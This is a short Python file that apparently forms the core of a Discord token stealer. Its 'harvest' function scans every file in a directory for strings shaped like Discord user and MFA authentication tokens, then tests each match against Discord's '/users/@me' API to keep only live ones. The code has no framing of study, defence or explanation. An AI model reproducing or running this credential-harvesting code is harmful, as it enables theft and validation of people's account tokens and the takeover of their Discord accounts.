import re, os, requests

def harvest(directory):
    pattern = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}")
    for name in os.listdir(directory):
        contents = open(os.path.join(directory, name), errors="ignore").read()
        for candidate in pattern.findall(contents):
            result = requests.get("https://discord.com/api/v9/users/@me",
                                  headers={"Authorization": candidate})
            if result.status_code == 200:
                yield candidate
